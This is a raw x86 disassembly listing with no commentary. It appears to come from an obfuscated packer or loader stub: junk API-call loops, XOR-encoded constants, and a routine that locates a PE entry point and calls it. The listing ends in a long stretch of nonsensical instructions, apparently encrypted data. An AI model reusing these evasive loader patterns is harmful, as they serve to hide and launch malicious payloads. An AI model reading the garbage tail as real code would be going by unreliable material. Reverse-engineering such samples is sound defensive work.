  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x424514
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x42411e
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x424132
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x42411a,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x42400a
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x424420
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x42400a
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x42421a
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x42400a
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x42421a,eax
  41bd4f:	mov    eax,ds:0x42400a
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x42400a
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423e8e,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x4240e2,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423e8e
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x42400a
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x4240e2
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423e8e
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x42400a
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x42400a
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x42400a
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x42408e,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x424086,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x42400a
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x424564
  41bfdc:	push   0x4244f6
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423e3a
  41c028:	mov    ecx,DWORD PTR ds:0x423e56
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423e8a
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0x63
  41c0c7:	aad    0x62
  41c0c9:	shl    BYTE PTR [edi*8+0x5f516261],0x62
  41c0d1:	bound  ebp,QWORD PTR [ebx+0x61808057]
  41c0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d8:	jp     0x41c0c6
  41c0da:	mov    ebp,0xff425408
  41c0df:	dec    ebp
  41c0e0:	xchg   edx,eax
  41c0e1:	repnz ror DWORD PTR [esi+eiz*1-0x28],1
  41c0e6:	dec    ebx
  41c0e7:	mov    bh,0x5a
  41c0e9:	pop    edi
  41c0ea:	cmp    eax,0x6eb0e022
  41c0ef:	jg     0x41c10f
  41c0f1:	cmp    esi,DWORD PTR [ebx-0x114cdb4e]
  41c0f7:	lea    eax,[ebx]
  41c0f9:	cmp    BYTE PTR [esi+esi*1],cl
  41c0fc:	out    0x30,eax
  41c0fe:	in     al,dx
  41c0ff:	mov    bl,0xde
  41c102:	int3   
  41c103:	sbb    DWORD PTR [ecx-0xe94ab80],edx
  41c109:	daa    
  41c10a:	jns    0x41c0c7
  41c10c:	stos   DWORD PTR es:[edi],eax
  41c10d:	popf   
  41c10e:	push   esp
  41c10f:	out    dx,eax
  41c110:	push   edx
  41c111:	out    0x1a,eax
  41c113:	adc    ah,BYTE PTR [edi-0x7a]
  41c116:	lods   eax,DWORD PTR ds:[esi]
  41c117:	push   0xfffffff9
  41c119:	mov    BYTE PTR [ecx],ah
  41c11b:	pop    ebp
  41c11c:	stos   BYTE PTR es:[edi],al
  41c11d:	xchg   ebp,eax
  41c11e:	or     eax,ebp
  41c120:	pop    eax
  41c121:	out    dx,al
  41c122:	loope  0x41c18c
  41c124:	inc    esp
  41c125:	xchg   DWORD PTR [esi],ebp
  41c127:	mov    ebx,0xbb5521c5
  41c12c:	jae    0x41c10f
  41c12e:	or     edi,DWORD PTR [ebx]
  41c130:	mov    ebp,0x9a9363df
  41c135:	jg     0x41c12a
  41c137:	cmp    BYTE PTR [eax+0x5360f078],ah
  41c13d:	mov    cs,WORD PTR [edx]
  41c13f:	push   edi
  41c140:	mov    edx,0x66c37ce9
  41c145:	hlt    
  41c146:	and    DWORD PTR [edx],edi
  41c148:	inc    esi
  41c149:	pop    ebp
  41c14a:	or     eax,0xb398f39c
  41c14f:	jp     0x41c1c6
  41c151:	aaa    
  41c152:	mov    eax,0xcbb2a2d8
  41c157:	jnp    0x41c14d
  41c159:	inc    ecx
  41c15a:	sub    DWORD PTR [ebx],edx
  41c15c:	xor    DWORD PTR [ecx],edi
  41c15e:	sbb    edx,DWORD PTR [esi]
  41c160:	inc    esi
  41c161:	mov    dh,0xce
  41c163:	mov    dh,0xa2
  41c165:	stc    
  41c166:	push   eax
  41c167:	in     eax,dx
  41c168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c169:	int3   
  41c16a:	and    eax,0xd914a6fb
  41c16f:	retf   0x8a10
  41c172:	mov    eax,0x97908648
  41c177:	outs   dx,DWORD PTR ds:[esi]
  41c178:	mov    ecx,0xfea326b1
  41c17d:	ret    0xe669
  41c180:	and    eax,0x426930f4
  41c185:	cmp    dl,ah
  41c187:	jmp    0x840592f9
  41c18c:	nop
  41c18d:	cmp    DWORD PTR [edx-0x52],0xffffff9f
  41c191:	mov    bh,0x7b
  41c193:	les    ebp,FWORD PTR [edi]
  41c195:	mov    cl,0xdc
  41c197:	mov    bl,0x5d
  41c199:	outs   dx,DWORD PTR ds:[esi]
  41c19a:	pushf  
  41c19b:	(bad)  
  41c19c:	sub    ebx,ebx
  41c19e:	das    
  41c19f:	xchg   edi,eax
  41c1a0:	(bad)  [eax]
  41c1a2:	lock mov ds:0x1e8b6bde,eax
  41c1a8:	retf   
  41c1a9:	fistp  WORD PTR [ecx]
  41c1ab:	mov    DWORD PTR [ebp+0x3b],ecx
  41c1ae:	add    al,0x58
  41c1b0:	scas   al,BYTE PTR es:[edi]
  41c1b1:	push   eax
  41c1b2:	aaa    
  41c1b3:	into   
  41c1b4:	or     BYTE PTR [ebp-0x2cf2df6b],dh
  41c1ba:	por    mm7,QWORD PTR [esi-0xbd8bd76]
  41c1c1:	jp     0x41c1ce
  41c1c3:	jno    0x41c1ac
  41c1c5:	cmp    DWORD PTR [ebx],0xbddbda6e
  41c1cb:	pop    edi
  41c1cc:	sub    cl,bl
  41c1ce:	fisub  WORD PTR [edi]
  41c1d0:	or     eax,0x95eb79ad
  41c1d5:	sub    ecx,0xf034b43e
  41c1db:	inc    edx
  41c1dc:	or     eax,0xee23a9f1
  41c1e1:	out    dx,eax
  41c1e2:	inc    ebx
  41c1e3:	inc    esi
  41c1e4:	scas   al,BYTE PTR es:[edi]
  41c1e5:	fucomp st(0)
  41c1e7:	out    dx,eax
  41c1e8:	pop    eax
  41c1e9:	leave  
  41c1ea:	jb     0x41c18e
  41c1ec:	mov    ebp,esp
  41c1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ef:	ror    cl,0x3a
  41c1f2:	cdq    
  41c1f3:	fnstsw WORD PTR [ecx-0x6bda855]
  41c1f9:	in     al,0x5d
  41c1fb:	jmp    0x5b0c:0x886c7bb2
  41c202:	sub    bh,BYTE PTR [edi+0x64]
  41c205:	arpl   WORD PTR [ecx+0x6],si
  41c208:	and    al,0x3
  41c20a:	push   esp
  41c20b:	dec    edi
  41c20c:	mov    cl,0x55
  41c20e:	retf   
  41c20f:	cli    
  41c210:	int3   
  41c211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c212:	xor    BYTE PTR [eax-0x54d0f464],dh
  41c218:	cmp    DWORD PTR [ecx+0x454779bf],esi
  41c21e:	inc    eax
  41c21f:	mov    ss,WORD PTR [edi-0x23c40fce]
  41c225:	cmp    ah,BYTE PTR [esi-0x3c]
  41c228:	or     al,0x15
  41c22a:	call   0xc7349d4e
  41c22f:	sub    al,0x4f
  41c231:	cmp    eax,0xde7da9a2
  41c236:	test   al,0x2a
  41c238:	outs   dx,DWORD PTR ds:[esi]
  41c239:	fild   QWORD PTR [bp+di]
  41c23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c23d:	stc    
  41c23e:	cmp    ebx,DWORD PTR [edi+ebx*8]
  41c241:	inc    ebx
  41c242:	fcmovnbe st,st(2)
  41c244:	sbb    BYTE PTR [eax],bh
  41c246:	es mov edi,0xfb4697e5
  41c24c:	add    BYTE PTR [esi+0x54],ah
  41c24f:	sti    
  41c250:	mov    edi,0x304be5ac
  41c255:	and    BYTE PTR [esi+0x90365f],0xc9
  41c25c:	push   0xffffff90
  41c25e:	cmp    DWORD PTR ds:0xd171a4e9,ecx
